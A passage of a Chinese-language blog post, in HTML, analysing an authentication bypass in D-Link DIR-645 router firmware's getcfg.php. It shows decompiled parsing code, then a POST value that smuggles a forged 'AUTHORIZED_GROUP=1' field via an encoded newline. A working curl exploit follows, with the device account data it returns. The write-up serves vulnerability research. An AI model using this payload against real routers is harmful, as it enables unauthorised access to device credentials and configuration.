+<p>分析 <code>cgibin_parse_request()</code> 函数可知，程序以 <code>&amp;</code> 作为分隔符对 POST 请求中的数据进行解析，然后使用 <code>\n</code> 作为解析后数据的分隔符，并将参数名称格式化为 <code>_POST_XXXX</code> 形式。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sobj_add_string(req_args, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">    v5 = sobj_get_string(a2[<span class="number">1</span>]);</span><br><span class="line">    sobj_add_string(req_args, v5);</span><br><span class="line">    sobj_add_char(req_args, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    v6 = a2[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = (<span class="type">void</span> **)sobj_get_string(v6);</span><br><span class="line">LABEL_11:</span><br><span class="line">  sobj_add_string(req_args, v11);</span><br><span class="line">  <span class="keyword">return</span> sobj_add_char(req_args, <span class="string">&#x27;\n&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因此，当 POST 请求数据中有 <code>A=a%0aAUTHORIZED_GROUP=1</code> 参数时，将会被解析成 <code>_POST_A=a\nAUTHORIZED_GROUP=1</code> 形式的数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST_A=a\nAUTHORIZED_GROUP=1\nAUTHORIZED_GROUP=0\nSESSION_UID=xxxx\n</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>AUTHORIZED_GROUP=1</code> 比 <code>AUTHORIZED_GROUP=0</code> 位置靠前，所以导致 PHP 读取所需参数时，得到的是伪造的校验数据，而非正确的校验数据。从而实现权限认证的绕过。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据漏洞分析，构造绕过权限认证的 POST 数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVICES=DEVICE.ACCOUNT&amp;A=a%0aAUTHORIZED_GROUP=1</span><br></pre></td></tr></table></figure>
+
+<p>读取设备的账号信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT&amp;A=a%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://192.168.0.1/getcfg.php&quot;</span></span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;postxml&gt;</span><br><span class="line">&lt;module&gt;</span><br><span class="line">	&lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;</span><br><span class="line">	&lt;device&gt;</span><br><span class="line">		&lt;gw_name&gt;DIR-645&lt;/gw_name&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;account&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;2&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;1&lt;/count&gt;</span><br><span class="line">			&lt;entry&gt;</span><br><span class="line">				&lt;uid&gt;&lt;/uid&gt;</span><br><span class="line">				&lt;name&gt;Admin&lt;/name&gt;</span><br><span class="line">				&lt;usrid&gt;&lt;/usrid&gt;</span><br><span class="line">				&lt;password&gt;&lt;/password&gt;</span><br><span class="line">				&lt;group&gt;0&lt;/group&gt;</span><br><span class="line">				&lt;description&gt;&lt;/description&gt;</span><br><span class="line">			&lt;/entry&gt;</span><br><span class="line">		&lt;/account&gt;</span><br><span class="line">		&lt;group&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;0&lt;/count&gt;</span><br><span class="line">		&lt;/group&gt;</span><br><span class="line">		&lt;session&gt;</span><br><span class="line">			&lt;captcha&gt;0&lt;/captcha&gt;</span><br><span class="line">			&lt;dummy&gt;&lt;/dummy&gt;</span><br><span class="line">			&lt;timeout&gt;600&lt;/timeout&gt;</span><br><span class="line">			&lt;maxsession&gt;128&lt;/maxsession&gt;</span><br><span class="line">			&lt;maxauthorized&gt;16&lt;/maxauthorized&gt;</span><br><span class="line">		&lt;/session&gt;</span><br><span class="line">	&lt;/device&gt;</span><br><span class="line">&lt;/module&gt;</span><br><span class="line">&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6453">Dlink getcfg.php远程敏感信息读取漏洞分析 - 先知社区</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/D-Link/" rel="tag"># D-Link</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="D-Link DIR-645 CNVD-2013-11625 漏洞分析">
+                  <i class="fa fa-angle-left"></i> D-Link DIR-645 CNVD-2013-11625 漏洞分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Voxzz</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
